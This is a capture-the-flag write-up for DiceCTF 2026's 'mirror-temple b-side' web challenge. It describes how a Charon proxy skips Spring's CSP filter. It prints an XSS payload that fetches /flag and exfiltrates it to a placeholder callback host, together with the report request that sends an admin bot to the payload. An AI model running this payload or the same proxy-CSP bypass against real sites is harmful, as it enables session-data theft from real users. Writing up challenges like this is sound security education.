# mirror-temple b-side

| Field       | Value                          |
|-------------|--------------------------------|
| Platform    | DiceCTF 2026                   |
| Category    | web                            |
| Difficulty  | Hard                           |
| Connection  | `https://mirror-temple-b-side-22f60eddacb0.ctfi.ng` |

## Description

> in a walled garden, you can't escape!

Hardened version of mirror-temple: same Spring Boot (Kotlin) application with Charon proxy, JWT auth, and Puppeteer admin bot. The key differences from the original are a stricter CSP (no `script-src *`, no iframes).

## TL;DR

The b-side hardened the CSP on normal pages but did not patch the Charon bypass. The proxy still intercepts requests before `SecurityTMFilter` adds CSP, so `/proxy` responses still lack security headers. The exploit is identical to the original mirror-temple: reporting `http://localhost:8080/proxy?url=XSS` causes the admin bot to visit the proxy with its valid cookie, execute XSS without CSP, and exfiltrate the flag.

## Differences from Original mirror-temple

```diff
- script-src * 'sha256-BoCRiehFBnKRTZ0eeC7grcuj5c7g5zRlYK9a9T2vgok=';
+ script-src 'sha384-eX8v58W...' 'sha384-dBNCwX...' 'sha384-ZRKYE...';

- style-src 'self' https://fonts.googleapis.com/css;
+ style-src 'sha384-x7cxE...' 'sha384-BVUGq...' https://fonts.googleapis.com/css;

- frame-src 'self';
- frame-ancestors 'self';
+ frame-src 'none';
+ frame-ancestors 'none';
```

Changes: `script-src *` was removed (which allowed loading external scripts) and iframe usage was prohibited. However, `CorsProxy.kt` and the admin bot flow did not change.

## Initial Analysis

### Tech Stack

- Spring Boot 3 (Kotlin) with Thymeleaf
- JWT (HS256) with random key generated at startup
- Charon reverse proxy library (`charon-spring-webmvc:5.4.0`) at `/proxy?url=...`
- Puppeteer admin bot (Node.js)
- Matter.js 0.20.0 (frontend physics)

### Relevant Endpoints

| Endpoint | Auth | Description |
|----------|------|-------------|
| `GET /postcard-from-nyc` | No | Registration form |
| `POST /postcard-from-nyc` | No | Generates JWT with name/portrait/flag |
| `GET /flag` | Yes | Returns the flag from the JWT |
| `GET /proxy?url=X` | Yes | Server-side proxy to arbitrary URL |
| `POST /report?url=X` | Yes | Launches admin bot with that URL |

### Admin Bot Flow (`admin.mjs`)

```javascript
// 1. Navigates to http://localhost:8080/postcard-from-nyc
await page.goto("http://localhost:8080/postcard-from-nyc", ...)
// 2. Types name "Admin" and the REAL FLAG
await page.type("#name", "Admin")
await page.type("#flag", flag)
await page.click(".begin")
// → JWT cookie with the real flag for the "localhost" domain
// 3. Visits our reported URL
await page.goto(targetUrl, ...)
```

## Vulnerability Identified

### Type: Charon proxy bypasses Spring Security Filter (CSP bypass)

**Three pieces:**

**1. Cookie scoped to localhost**
The admin bot registers at `http://localhost:8080`. The JWT cookie with the real flag is for `localhost`, not for the challenge's public domain. If the admin visits a `localhost` URL, its cookie is sent.

**2. Charon intercepts before SecurityTMFilter**
`SecurityTMFilter` (which adds CSP and other headers) has `@Order(LOWEST_PRECEDENCE)`. The Charon library registers its interceptor with higher priority and processes `/proxy` before the filter adds headers. Result: **proxy responses do not have `Content-Security-Policy`**.

Verification:
```bash
curl -sv "https://mirror-temple-b-side-22f60eddacb0.ctfi.ng/proxy?url=http://httpbin.org/get" 2>&1 | grep -i "content-security"
# → No result: no CSP header
```

**3. XSS without CSP on same origin as the cookie**
If we report `http://localhost:8080/proxy?url=XSS_PAGE`:
- Admin visits `localhost:8080/proxy` → JWT cookie sent (same-origin)
- Proxy serves our HTML without CSP → JS executes freely
- `fetch('/flag')` with cookie → real flag
- Exfiltration to callback server

## Solution Process

### Step 1: Identify differences from original mirror-temple

```bash
diff -rq mirror-temple/chall/src mirror-temple-b/chall/src
# Only SecurityTM.kt, index.html (CSS moved), postcard-from-nyc.html (CSS inlined)
# CorsProxy.kt: IDENTICAL
# admin.mjs: IDENTICAL
```

Conclusion: the proxy bypass was not patched.

### Step 2: Confirm that /proxy still lacks CSP

```bash
curl -sv "https://mirror-temple-b-side-22f60eddacb0.ctfi.ng/proxy?url=http://httpbin.org/get" 2>&1 | grep -E "content-security|access-control"
# access-control-allow-credentials: true  (from httpbin, not from the server)
# access-control-allow-origin: *          (from httpbin)
# → No CSP: vulnerability confirmed
```

### Step 3: Build XSS payload

```html
<html><body><script>
(async()=>{
try{
let r=await fetch("/flag");
let f=await r.text();
new Image().src="https://CALLBACK/flag?f="+encodeURIComponent(f);
navigator.sendBeacon("https://CALLBACK/b",f);
}catch(e){
new Image().src="https://CALLBACK/err?e="+encodeURIComponent(e.message);
}
})();
</script></body></html>
```

Hosted via `http://httpbin.org/base64/<URL_SAFE_BASE64>` (the proxy uses HTTP, not HTTPS for payload URLs).

### Step 4: Execute exploit

```
POST /report
url=http://localhost:8080/proxy?url=http://httpbin.org/base64/<PAYLOAD_B64>
```

Admin bot:
1. Registers with real flag → JWT cookie for `localhost`
2. Visits `http://localhost:8080/proxy?url=<XSS>` → cookie sent
3. Proxy serves HTML without CSP → JS executes
4. `fetch('/flag')` → real flag
5. `sendBeacon` + `Image` → flag arrives at callback

## Discarded Approaches

1. **`mirror` parameter to lower CSP** → SecurityTMFilter overwrites CSP after the mirror, impossible
2. **Iframe attack** → b-side added `frame-src 'none'` blocking it
3. **External script via portrait** → b-side removed `script-src *`, strict hashes
4. **CORS from external domain** → `Access-Control-Allow-Origin: ""` on normal responses blocks cross-origin fetch
5. **JWT forgery** → random HS256 key, not crackable

## Final Exploit

See `solve.py`.

## Execution

```bash
# Terminal 1: callback server + tunnel
python3 callback_server.py &
cloudflared tunnel --url http://localhost:9999 --no-autoupdate &
# Copy the tunnel URL

# Terminal 2: exploit
python3 solve.py https://mirror-temple-b-side-22f60eddacb0.ctfi.ng https://YOUR-TUNNEL.trycloudflare.com
```

## Flag

```
dice{neves_xis_cixot_eb_ot_tey_hguone_gnol_galf_siht_si_syawyna_ijome_lluks_eseehc_eht_rof_llef_dna_part_eht_togrof_i_derit_os_saw_i_galf_siht_gnitirw_fo_sa_sruoh_42_rof_ekawa_neeb_evah_i_tcaf_nuf}
```

(Reversed: "fun_fact_i_have_been_awake_for_42_hours_as_of_writing_this_flag_i_was_so_tired_i_forgot_the_trap_and_fell_for_the_cheese_skull_emoji_anyway_this_flag_is_long_enough_yet_to_be_toxic_six_seven")

## Key Lessons

- **The b-side hardened CSP but not the proxy**: partial patch → same root vulnerability
- **Charon (and similar proxies) can bypass Spring Security filters**: always check interceptor ordering when embedded reverse proxies are involved
- **`@Order(LOWEST_PRECEDENCE)` on security filters is dangerous**: any component with higher priority can skip the security headers
- **httpbin.org/base64 as HTTP hosting for XSS**: useful when the proxy only accepts HTTP

## References

- [Charon Spring reverse proxy](https://github.com/mkopylec/charon-spring-boot-starter)
- [mirror-temple solution.md](../mirror-temple/solution.md) — identical base exploit
